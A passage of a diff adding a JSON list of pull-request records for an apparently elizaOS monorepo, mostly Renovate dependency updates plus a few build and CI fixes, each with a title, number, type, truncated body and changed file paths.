+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [androidx.core:core-splashscreen](https",
+      "files": [
+        "packages/app-core/platforms/android/variables.gradle"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency androidx.coordinatorlayout:coordinatorlayout to v1.3.0",
+      "prNumber": 6852,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [androidx.coordinatorlayout:coordinator",
+      "files": [
+        "packages/app-core/platforms/android/variables.gradle"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency androidx.appcompat:appcompat to v1.7.1",
+      "prNumber": 6851,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [androidx.appcompat:appcompat](https://",
+      "files": [
+        "packages/app-core/platforms/android/variables.gradle"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency @xterm/addon-fit to ^0.11.0",
+      "prNumber": 6850,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@xterm/addon-fit](https://redirect.git",
+      "files": [
+        "apps/app-task-coordinator/package.json",
+        "packages/app-core/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency @stwd/sdk to ^0.7.0",
+      "prNumber": 6849,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@stwd/sdk](https://steward.fi) ([sourc",
+      "files": [
+        "apps/app-steward/package.json",
+        "packages/app-core/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency @orca-so/whirlpools-sdk to ^0.20.0",
+      "prNumber": 6848,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@orca-so/whirlpools-sdk](https://orca.",
+      "files": [
+        "packages/benchmarks/solana/solana-gym-env/voyager/skill_runner/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency @coral-xyz/borsh to ^0.32.0",
+      "prNumber": 6847,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| @&#8203;coral-xyz/borsh | [`^0.31.1` → ",
+      "files": [
+        "packages/benchmarks/solana/solana-gym-env/voyager/skill_runner/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency @coral-xyz/anchor to ^0.32.0",
+      "prNumber": 6846,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@coral-xyz/anchor](https://redirect.gi",
+      "files": [
+        "packages/benchmarks/solana/solana-gym-env/voyager/skill_runner/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency @anthropic-ai/sdk to ^0.90.0",
+      "prNumber": 6845,
+      "type": "bugfix",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-con",
+      "files": [
+        "packages/typescript/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update capacitor monorepo to v8.3.1",
+      "prNumber": 6844,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@capacitor/cli](https://capacitorjs.co",
+      "files": [
+        "packages/app-core/package.json",
+        "packages/elizaos/templates/fullstack-app/apps/app/package.json",
+        "packages/templates/fullstack-app/apps/app/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update supabase/postgres docker tag to v15.14.1.107",
+      "prNumber": 6843,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| supabase/postgres | minor | `15.1.0.147` → `15.14.1.107` |\n\n---\n\n> [!WARNING]\n> Some dependencies could not be looked up. Check the [Dependency Dashboard",
+      "files": [
+        "packages/app-core/deploy/docker-compose.supabase-db.yml"
+      ]
+    },
+    {
+      "title": "chore(deps): update rust crate uuid to v1.23.1",
+      "prNumber": 6842,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [uuid](https://redirect.github.com/uuid-rs/uuid) | dependencies | minor | `1.19.0` → `1.23.1` |\n\n---\n\n> [!WARNING]\n> Some dependencies could n",
+      "files": [
+        "packages/rust/Cargo.lock"
+      ]
+    },
+    {
+      "title": "chore(deps): update rust crate tokio to v1.52.1",
+      "prNumber": 6841,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [tokio](https://tokio.rs) ([source](https://redirect.github.com/tokio-rs/tokio)) | dev-dependencies | minor | `1.49.0` → `1.52.1` |\n| [tokio](",
+      "files": [
+        "packages/rust/Cargo.lock"
+      ]
+    },
+    {
+      "title": "chore(deps): update rust crate reqwest to 0.13",
+      "prNumber": 6840,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [reqwest](https://redirect.github.com/seanmonstar/reqwest) | workspace.dependencies | minor | `0.11` → `0.13` |\n\n---\n\n> [!WARNING]\n> Some depe",
+      "files": [
+        "packages/benchmarks/HyperliquidBench/Cargo.toml"
+      ]
+    },
+    {
+      "title": "chore(deps): update node.js to v23.11.1",
+      "prNumber": 6839,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [node](https://nodejs.org) ([source](https://redirect.github.com/nodejs/node)) |  | minor | `v23.3.0` → `23.11.1` |\n| [node](https://nodejs.or",
+      "files": [
+        ".nvmrc",
+        "package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update gradle to v8.14.4",
+      "prNumber": 6838,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [gradle](https://gradle.org) ([source](https://redirect.github.com/gradle/gradle)) | minor | `8.9` → `8.14.4` |\n\n---\n\n> [!WARNING]\n> Some dependencies co",
+      "files": [
+        "packages/app-core/platforms/android/gradle/wrapper/gradle-wrapper.jar",
+        "packages/app-core/platforms/android/gradle/wrapper/gradle-wrapper.properties",
+        "packages/app-core/platforms/android/gradlew",
+        "packages/app-core/platforms/android/gradlew.bat"
+      ]
+    },
+    {
+      "title": "chore(deps): update docker/dockerfile docker tag to v1.23",
+      "prNumber": 6837,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [docker/dockerfile](https://redirect.github.com/moby/buildkit) | syntax | minor | `1.7` → `1.23` |\n\n---\n\n> [!WARNING]\n> Some dependencies coul",
+      "files": [
+        "packages/app-core/deploy/Dockerfile.ci",
+        "packages/app-core/deploy/Dockerfile.cloud",
+        "packages/app-core/deploy/Dockerfile.cloud-agent"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency vitest to v3.2.4",
+      "prNumber": 6836,
+      "type": "tests",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-con",
+      "files": [
+        "packages/benchmarks/configbench/package.json",
+        "plugins/plugin-calendly/package.json",
+        "plugins/plugin-github/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency typescript to v5.9.3",
+      "prNumber": 6835,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [typescript](https://www.typescriptlang",
+      "files": [
+        "packages/benchmarks/configbench/package.json",
+        "plugins/plugin-calendly/package.json",
+        "plugins/plugin-github/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency typedoc-plugin-markdown to v4.11.0",
+      "prNumber": 6834,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [typedoc-plugin-markdown](https://typed",
+      "files": [
+        "package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency typedoc to v0.28.19",
+      "prNumber": 6833,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [typedoc](https://typedoc.org) ([source",
+      "files": [
+        "package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency tsup to v8.5.1",
+      "prNumber": 6832,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [tsup](https://tsup.egoist.dev/) ([sour",
+      "files": [
+        "plugins/plugin-calendly/package.json",
+        "plugins/plugin-github/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency python-dotenv to v0.21.1",
+      "prNumber": 6831,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [python-dotenv](https://redirect.github",
+      "files": [
+        "packages/benchmarks/OSWorld/monitor/requirements.txt"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency python",
+      "prNumber": 6830,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [python](https://redirect.github.com/python/cpython) |  | minor | `3.12` → `3.14.4` |\n| [python](https://redirect.github.com/actions/python-ve",
+      "files": [
+        ".github/workflows/ci.yaml",
+        ".github/workflows/jsdoc-automation.yml",
+        ".github/workflows/multi-lang-tests.yaml",
+        ".github/workflows/release-python.yaml",
+        "packages/benchmarks/OSWorld/.mise.toml",
+        "packages/benchmarks/OSWorld/monitor/Dockerfile",
+        "packages/benchmarks/clawbench/Dockerfile.init",
+        "packages/benchmarks/clawbench/Dockerfile.mock-tools"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency pynput to ~=1.8.1",
+      "prNumber": 6829,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [pynput](https://redirect.github.com/mo",
+      "files": [
+        "packages/benchmarks/OSWorld/requirements.txt",
+        "packages/benchmarks/OSWorld/setup.py"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency pandas to v2.3.3",
+      "prNumber": 6828,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [pandas](https://redirect.github.com/pa",
+      "files": [
+        "packages/benchmarks/OSWorld/requirements.txt",
+        "packages/benchmarks/OSWorld/setup.py"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency p5.js to v1.11.10",
+      "prNumber": 6827,
+      "type": "other",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Update | Change |\n|---|---|---|\n| [p5.js](http://p5js.org) ([source](https://redirect.github.com/processing/p5.js)) ",
+      "files": [
+        "packages/benchmarks/openclaw-benchmark/mistralvibecli/.isolated_home/.vibe/skills/anthropic-algorithmic-art/templates/viewer.html"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency opencv-python-headless to ~=4.13.0.92",
+      "prNumber": 6826,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [opencv-python-headless](https://redire",
+      "files": [
+        "packages/benchmarks/OSWorld/requirements.txt",
+        "packages/benchmarks/OSWorld/setup.py"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency numpy to ~=1.26.4",
+      "prNumber": 6825,
+      "type": "other",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-con",
+      "files": [
+        "packages/benchmarks/OSWorld/requirements.txt"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency is-core-module to v2.16.1",
+      "prNumber": 6824,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [is-core-module](https://redirect.githu",
+      "files": [
+        "package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency esbuild to ^0.28.0",
+      "prNumber": 6823,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [esbuild](https://redirect.github.com/e",
+      "files": [
+        "packages/typescript/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency ag2 to ~=0.12.0",
+      "prNumber": 6822,
+      "type": "other",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-con",
+      "files": [
+        "packages/benchmarks/OSWorld/requirements.txt",
+        "packages/benchmarks/OSWorld/setup.py"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency @uniswap/v4-sdk to v1.30.0",
+      "prNumber": 6821,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@uniswap/v4-sdk](https://redirect.gith",
+      "files": [
+        "package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency @uniswap/v3-sdk to v3.30.0",
+      "prNumber": 6820,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@uniswap/v3-sdk](https://redirect.gith",
+      "files": [
+        "package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency @uniswap/v2-sdk to v4.20.0",
+      "prNumber": 6819,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@uniswap/v2-sdk](https://redirect.gith",
+      "files": [
+        "package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency @types/node to v25.6.0",
+      "prNumber": 6818,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@types/node](https://redirect.github.c",
+      "files": [
+        "package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency @types/node to v22.19.17",
+      "prNumber": 6817,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@types/node](https://redirect.github.c",
+      "files": [
+        "plugins/plugin-calendly/package.json",
+        "plugins/plugin-github/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency @ionic/eslint-config to ^0.4.0",
+      "prNumber": 6816,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@ionic/eslint-config](https://redirect",
+      "files": [
+        "packages/native-plugins/gateway/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency @capacitor/docgen to ^0.3.0",
+      "prNumber": 6815,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@capacitor/docgen](https://capacitorjs",
+      "files": [
+        "packages/native-plugins/gateway/package.json",
+        "packages/native-plugins/location/package.json",
+        "packages/native-plugins/talkmode/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency com.android.tools.build:gradle to v8.13.2",
+      "prNumber": 6814,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [com.android.tools.build:gradle](https:",
+      "files": [
+        "packages/app-core/platforms/android/build.gradle"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency @elizaos/plugin-sql to v2.0.0-alpha.19",
+      "prNumber": 6813,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@elizaos/plugin-sql](https://redirect.",
+      "files": [
+        "packages/app-core/deploy/cloud-agent-template/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency @elizaos/plugin-elizacloud to v2.0.0-alpha.8",
+      "prNumber": 6812,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@elizaos/plugin-elizacloud](https://re",
+      "files": [
+        "packages/app-core/deploy/cloud-agent-template/package.json",
+        "packages/typescript/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency @elizaos/core",
+      "prNumber": 6811,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| @&#8203;elizaos/core | [`2.0.0-alpha.3`",
+      "files": [
+        "packages/app-core/deploy/cloud-agent-template/package.json",
+        "packages/benchmarks/configbench/package.json"
+      ]
+    },
+    {
+      "title": "fix(build): unblock NPM Release — TS errors in agent/app-core/ui",
+      "prNumber": 6810,
+      "type": "bugfix",
+      "body": "## Summary\n\nNPM Release has been failing on `develop` for several pushes (alpha.174–181 \"Release Failed\"). This fixes the TypeScript errors blocking the `@elizaos/agent`, `@elizaos/app-core`, and `@elizaos/ui` build steps so releases can go",
+      "files": [
+        "apps/app-lifeops/src/actions/computer-use.ts",
+        "apps/app-lifeops/src/actions/cross-channel-send.ts",
+        "apps/app-training/src/backends/tinker.ts",
+        "apps/app-training/src/core/training-orchestrator.ts",
+        "packages/agent/src/api/apps-routes.ts",
+        "packages/agent/src/external-modules.d.ts",
+        "packages/agent/src/services/plugin-manager-types.ts",
+        "packages/app-core/tsconfig.json",
+        "packages/ui/tsconfig.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency @capacitor/keyboard to v8.0.3",
+      "prNumber": 6809,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@capacitor/keyboard](https://redirect.",
+      "files": [
+        "packages/app-core/package.json",
+        "packages/elizaos/templates/fullstack-app/apps/app/package.json",
+        "packages/templates/fullstack-app/apps/app/package.json"
+      ]
+    },
+    {
+      "title": "fix(deps): update dependency @capacitor/haptics to v8.0.2",
+      "prNumber": 6808,
+      "type": "bugfix",
+      "body": "This PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-confidence/) |\n|---|---|---|---|\n| [@capacitor/haptics](https://redirect.g",
+      "files": [
+        "packages/app-core/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update rust crate tracing-subscriber to v0.3.23",
+      "prNumber": 6807,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [tracing-subscriber](https://tokio.rs) ([source](https://redirect.github.com/tokio-rs/tracing)) | dependencies | patch | `0.3.22` → `0.3.23` |",
+      "files": [
+        "packages/rust/Cargo.lock"
+      ]
+    },
+    {
+      "title": "chore(deps): update rust crate thiserror to v2.0.18",
+      "prNumber": 6806,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [thiserror](https://redirect.github.com/dtolnay/thiserror) | dependencies | patch | `2.0.17` → `2.0.18` |\n\n---\n\n> [!WARNING]\n> Some dependenci",
+      "files": [
+        "packages/rust/Cargo.lock"
+      ]
+    },
+    {
+      "title": "Shaw/pr1886 ci followups",
+      "prNumber": 6805,
+      "type": "other",
+      "body": "<!-- Use this template by filling in information and copying and pasting relevant items out of the HTML comments. -->\r\n\r\n# Relates to\r\n\r\n<!-- LINK TO ISSUE OR TICKET -->\r\n\r\n<!-- This risks section must be filled out before the final review ",
+      "files": [
+        "packages/app-core/scripts/desktop-build.mjs",
+        "packages/app-core/scripts/docker-ci-smoke.sh",
+        "packages/elizaos/templates/plugin/typescript/src/__tests__/test-utils.ts",
+        "plugins/plugin-shell"
+      ]
+    },
+    {
+      "title": "Milady/shaw/UI smoke e2e fixes 20260417 gitlink",
+      "prNumber": 6804,
+      "type": "bugfix",
+      "body": "<!-- Use this template by filling in information and copying and pasting relevant items out of the HTML comments. -->\r\n\r\n# Relates to\r\n\r\n<!-- LINK TO ISSUE OR TICKET -->\r\n\r\n<!-- This risks section must be filled out before the final review ",
+      "files": [
+        ".github/workflows/release.yaml",
+        "apps/app-defense-of-the-agents/package.json",
+        "apps/app-defense-of-the-agents/src/routes.ts",
+        "apps/app-defense-of-the-agents/test/lifecycle.test.ts",
+        "apps/app-lifeops/src/actions/approval.ts",
+        "apps/app-lifeops/src/actions/cross-channel-send.ts",
+        "apps/app-lifeops/src/actions/search-across-channels.ts",
+        "apps/app-lifeops/src/activity-profile/proactive-worker.ts",
+        "apps/app-lifeops/src/components/ApprovalsPanel.tsx",
+        "apps/app-lifeops/src/components/LifeOpsPageView.tsx",
+        "apps/app-lifeops/src/dossier/service.ts",
+        "apps/app-lifeops/src/followup/followup-tracker.ts",
+        "apps/app-lifeops/src/lifeops/approval-queue.ts",
+        "apps/app-lifeops/src/lifeops/approval-queue.types.ts",
+        "apps/app-lifeops/src/lifeops/background-planner-dispatch.ts",
+        "apps/app-lifeops/src/lifeops/background-planner.ts",
+        "apps/app-lifeops/src/lifeops/discord-browser-scraper.ts",
+        "apps/app-lifeops/src/lifeops/google-drive.ts",
+        "apps/app-lifeops/src/lifeops/imessage-bridge.ts",
+        "apps/app-lifeops/src/lifeops/notifications-push.ts",
+        "apps/app-lifeops/src/lifeops/runtime.ts",
+        "apps/app-lifeops/src/lifeops/service-mixin-discord.ts",
+        "apps/app-lifeops/src/lifeops/service-mixin-drive.ts",
+        "apps/app-lifeops/src/lifeops/service-mixin-imessage.ts",
+        "apps/app-lifeops/src/lifeops/service-mixin-notifications.ts",
+        "apps/app-lifeops/src/lifeops/service-mixin-signal.ts",
+        "apps/app-lifeops/src/lifeops/service-mixin-telegram.ts",
+        "apps/app-lifeops/src/lifeops/service-mixin-travel.ts",
+        "apps/app-lifeops/src/lifeops/service-mixin-whatsapp.ts",
+        "apps/app-lifeops/src/lifeops/service-mixin-x-read.ts",
+        "apps/app-lifeops/src/lifeops/service-mixin-x.ts",
+        "apps/app-lifeops/src/lifeops/service.ts",
+        "apps/app-lifeops/src/lifeops/telegram-local-client.ts",
+        "apps/app-lifeops/src/lifeops/travel-adapters/duffel.ts",
+        "apps/app-lifeops/src/lifeops/unified-search.ts",
+        "apps/app-lifeops/src/lifeops/whatsapp-client.ts",
+        "apps/app-lifeops/src/plugin.ts",
+        "apps/app-lifeops/src/providers/cross-channel-context.ts",
+        "apps/app-lifeops/test/approval-queue.integration.test.ts",
+        "apps/app-lifeops/test/background-job-parity.contract.test.ts",
+        "apps/app-lifeops/test/google-drive.integration.test.ts",
+        "apps/app-lifeops/test/lifeops-signal-inbound.integration.test.ts",
+        "apps/app-lifeops/test/lifeops-whatsapp-sync.integration.test.ts",
+        "apps/app-lifeops/test/lifeops-x-dm-inbound.integration.test.ts",
+        "apps/app-lifeops/test/notifications-push.integration.test.ts",
+        "apps/app-lifeops/test/travel-duffel.integration.test.ts",
+        "apps/app-lifeops/test/unified-search.integration.test.ts",
+        "packages/agent/src/actions/entity-actions.ts",
+        "packages/agent/src/api/apps-routes-heartbeat.test.ts",
+        "packages/agent/src/api/apps-routes.ts"
+      ]
+    },
+    {
+      "title": "chore(deps): update rust crate regex to v1.12.3",
+      "prNumber": 6802,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [regex](https://redirect.github.com/rust-lang/regex) | dependencies | patch | `1.12.2` → `1.12.3` |\n\n---\n\n> [!WARNING]\n> Some dependencies cou",
+      "files": [
+        "packages/rust/Cargo.lock"
+      ]
+    },
+    {
+      "title": "chore(deps): update rust crate quick-xml to v0.39.2",
+      "prNumber": 6801,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [quick-xml](https://redirect.github.com/tafia/quick-xml) | dependencies | patch | `0.39.0` → `0.39.2` |\n\n---\n\n> [!WARNING]\n> Some dependencies",
+      "files": [
+        "packages/rust/Cargo.lock"
+      ]
+    },
+    {
+      "title": "ci(release): stop auto-filing Release Failed issues",
+      "prNumber": 6800,
+      "type": "other",
+      "body": "## Summary\n- Remove the failure-issue automation from `.github/workflows/release.yaml` (the `# Handle failure - create issue if the workflow failed` block: content file + existence check + create + reuse).\n- Every failed alpha publish was s",
+      "files": [
+        ".github/workflows/release.yaml"
+      ]
+    },
+    {
+      "title": "fix(packaging): inject tailwindcss for snap builds",
+      "prNumber": 6799,
+      "type": "bugfix",
+      "body": "<!-- greptile_comment -->\n\n<h3>Greptile Summary</h3>\n\nThis PR fixes snap builds by injecting the `tailwindcss` package directly into `eliza/packages/app-core/node_modules` during the build phase, resolving a Vite/PostCSS CSS pipeline failur",
+      "files": [
+        "packages/app-core/packaging/snap/snapcraft.yaml"
+      ]
+    },
+    {
+      "title": "chore(deps-dev): bump the npm_and_yarn group across 2 directories with 1 update",
+      "prNumber": 6796,
+      "type": "other",
+      "body": "Bumps the npm_and_yarn group with 1 update in the /plugins/plugin-calendly directory: [vitest](https://github.com/vitest-dev/vitest/tree/HEAD/packages/vitest).\nBumps the npm_and_yarn group with 1 update in the /plugins/plugin-github directo",
+      "files": [
+        "packages/app-core/test/contracts/lib/openzeppelin-contracts/package-lock.json",
+        "packages/app-core/test/contracts/lib/openzeppelin-contracts/package.json",
+        "plugins/plugin-calendly/package.json",
+        "plugins/plugin-github/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update dependency vitest to v4 [security]",
+      "prNumber": 6795,
+      "type": "tests",
+      "body": "> ℹ️ **Note**\n> \n> This PR body was truncated due to platform limits.\n\nThis PR contains the following updates:\n\n| Package | Change | [Age](https://docs.renovatebot.com/merge-confidence/) | [Confidence](https://docs.renovatebot.com/merge-con",
+      "files": [
+        "packages/elizaos/templates/fullstack-app/apps/app/package.json",
+        "packages/native-plugins/macosalarm/package.json",
+        "packages/templates/fullstack-app/apps/app/package.json",
+        "plugins/plugin-bluebubbles/typescript/package.json",
+        "plugins/plugin-calendly/package.json",
+        "plugins/plugin-github/package.json"
+      ]
+    },
+    {
+      "title": "chore(deps): update rust crate once_cell to v1.21.4",
+      "prNumber": 6792,
+      "type": "other",
+      "body": "This PR contains the following updates:\n\n| Package | Type | Update | Change |\n|---|---|---|---|\n| [once_cell](https://redirect.github.com/matklad/once_cell) | dependencies | patch | `1.21.3` → `1.21.4` |\n\n---\n\n> [!WARNING]\n> Some dependenci",
+      "files": [
+        "packages/rust/Cargo.lock"
+      ]
+    },
+    {
+      "title": "chore(deps): update rust crate futures to v0.3.32",
+      "prNumber": 6791,
+      "type": "other",
